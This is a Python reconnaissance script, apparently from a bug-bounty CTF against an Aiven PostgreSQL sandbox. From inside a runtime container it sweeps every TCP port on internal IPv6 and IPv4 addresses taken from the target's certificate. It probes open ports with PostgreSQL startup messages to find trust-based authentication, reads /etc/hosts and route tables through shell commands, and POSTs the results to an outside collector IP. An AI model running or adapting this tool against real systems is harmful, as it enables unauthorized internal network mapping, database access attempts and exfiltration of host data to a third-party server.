#!/usr/bin/env python3
"""probe7 - full TCP port sweep of the CTF service's OWN internal addresses, from inside Aiven.

Why: the in-scope service's certificate names its internal addresses (10.1.8.115 and the ULA
fda7:a938:5bfe:5fa6:0:5e9:cd8f:2191). The ULA routes from a runtime container (it answers with
refusals), and our Oct-17 probe only sampled ~14 ports on it. A postgresql service listens on *some*
internal port; if it listens internally with a pg_hba rule that trusts internal sources (which is
exactly how a dev sandbox is commonly wired) that is the way in. Fourteen ports is not an answer to
"which port"; a sweep is.

Scope: both addresses belong to the in-scope service itself (they are SANs of its own certificate).
Nothing else is contacted. The scan is unauthenticated TCP connect-only, no payloads except a single
PostgreSQL SSLRequest on ports that accept a connection.

Results are POSTed to the collector and served on :8080.
"""
from __future__ import annotations

import json
import os
import socket
import ssl
import struct
import subprocess
import threading
import time
from http.server import BaseHTTPRequestHandler, HTTPServer

COLLECTOR = "http://208.87.134.252:9200/rt7"
TARGETS = [
    ("ctf-ula", "fda7:a938:5bfe:5fa6:0:5e9:cd8f:2191"),   # internal IPv6 from the service certificate
    ("ctf-v4", "10.1.8.115"),                             # internal IPv4 from the same certificate
    ("ctf-public", "193.122.235.156"),                    # control: the public endpoint we know works
]
CONCURRENCY = 64
CONNECT_TIMEOUT = 1.5
RESULTS = {"stage": "init", "open": {}, "pg": {}, "facts": {}, "notes": []}
LOCK = threading.Lock()
PORT_QUEUE = list(range(1, 65536))
QIDX = 0


def sh(cmd, t=8):
    try:
        r = subprocess.run(["/bin/sh", "-c", cmd], capture_output=True, text=True, timeout=t)
        return (r.stdout + r.stderr).strip()[:600]
    except Exception as e:                                              # noqa: BLE001
        return "ERR %s" % e


def connect_port(host, port):
    fam = socket.AF_INET6 if ":" in host else socket.AF_INET
    try:
        s = socket.socket(fam, socket.SOCK_STREAM)
        s.settimeout(CONNECT_TIMEOUT)
        s.connect((host, port))
        try:
            s.sendall(struct.pack("!ii", 8, 80877103))
            reply = s.recv(4)
        except Exception:                                               # noqa: BLE001
            reply = b""
        s.close()
        return {"state": "open", "reply": reply[:8].decode("latin1", "replace")}
    except socket.timeout:
        return {"state": "timeout"}
    except ConnectionRefusedError:
        return {"state": "refused"}
    except OSError as e:
        return {"state": type(e).__name__}


def scan(host, label):
    global QIDX
    while True:
        with LOCK:
            if QIDX >= len(PORT_QUEUE):
                return
            port = PORT_QUEUE[QIDX]
            QIDX += 1
        r = connect_port(host, port)
        if r["state"] not in ("refused", "timeout"):
            with LOCK:
                RESULTS["open"]["%s:%d" % (label, port)] = r


def pg_auth(host, port, user):
    fam = socket.AF_INET6 if ":" in host else socket.AF_INET
    try:
        s = socket.socket(fam, socket.SOCK_STREAM)
        s.settimeout(6)
        s.connect((host, port))
        s.sendall(struct.pack("!ii", 8, 80877103))
        r = s.recv(1)
        mode = "no-tls"
        if r == b"S":
            ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            s = ctx.wrap_socket(s, server_hostname="falcon-bug-bounty-flag-pgsql-dev-sandbox.e.aivencloud.com")
            mode = "tls"
        body = struct.pack("!i", 196610)
        for k, v in (("user", user), ("database", "defaultdb"), ("application_name", "aiven-bugbounty/1.0 (Bugcrowd-zllr)")):
            body += k.encode() + b"\x00" + v.encode() + b"\x00"
        body += b"\x00"
        s.sendall(struct.pack("!i", len(body) + 4) + body)
        for _ in range(4):
            h = s.recv(5)
            if len(h) < 5:
                s.close()
                return "%s: closed" % mode
            n = struct.unpack("!i", h[1:5])[0]
            p = b""
            while len(p) < n - 4:
                c = s.recv(n - 4 - len(p))
                if not c:
                    break
                p += c
            if h[:1] == b"R":
                code = struct.unpack("!i", p[:4])[0]
                s.close()
                return "%s: %s" % (mode, {0: "TRUST", 3: "CLEARTEXT", 5: "MD5", 10: "SCRAM"}.get(code, code))
            if h[:1] == b"E":
                m = p.split(b"M", 1)[1].split(b"\x00", 1)[0].decode("latin1") if b"M" in p else "?"
                s.close()
                return "%s: error %s" % (mode, m[:50])
            if h[:1] == b"v":
                continue
        s.close()
        return "%s: no auth message" % mode
    except Exception as e:                                              # noqa: BLE001
        return "%s" % type(e).__name__


class H(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.end_headers()
        self.wfile.write(json.dumps(RESULTS, indent=1).encode())

    def log_message(self, *a):
        pass


threading.Thread(target=lambda: HTTPServer(("0.0.0.0", int(os.environ.get("PORT", "8080"))), H).serve_forever(),
                 daemon=True).start()
time.sleep(2)
RESULTS["facts"]["ip6"] = sh("ip -6 addr 2>/dev/null | grep inet6 | head -4")
RESULTS["facts"]["hosts"] = sh("cat /etc/hosts")
RESULTS["facts"]["route6"] = sh("ip -6 route 2>/dev/null | head -6")

for label, host in TARGETS:
    RESULTS["stage"] = "scanning " + label
    t0 = time.time()
    threads = [threading.Thread(target=scan, args=(host, label), daemon=True) for _ in range(CONCURRENCY)]
    for t in threads:
        t.start()
    for t in threads:
        t.join()
    RESULTS["notes"].append("%s scan finished in %.0fs, ports answering: %d" % (
        label, time.time() - t0,
        sum(1 for k in RESULTS["open"] if k.startswith(label + ":"))))
    # look at anything that answered with a PG-style SSL reply, or any open PG-ish port
    for key, v in list(RESULTS["open"].items()):
        if not key.startswith(label + ":"):
            continue
        port = int(key.rsplit(":", 1)[1])
        if v.get("reply", "").startswith("N") or v.get("reply", "").startswith("S") or port in (5432, 6432):
            for user in ("avnadmin", "ctf"):
                RESULTS["pg"]["%s:%d/%s" % (label, port, user)] = pg_auth(host, port, user)

RESULTS["stage"] = "done"
RESULTS["finished"] = time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())
body = json.dumps(RESULTS)
try:
    import urllib.request
    urllib.request.urlopen(urllib.request.Request(COLLECTOR, data=body.encode(),
                                                  headers={"Content-Type": "application/json"}), timeout=20)
except Exception as e:                                                  # noqa: BLE001
    print("collector post failed:", e)
print(json.dumps(RESULTS)[:3000])
while True:
    time.sleep(60)
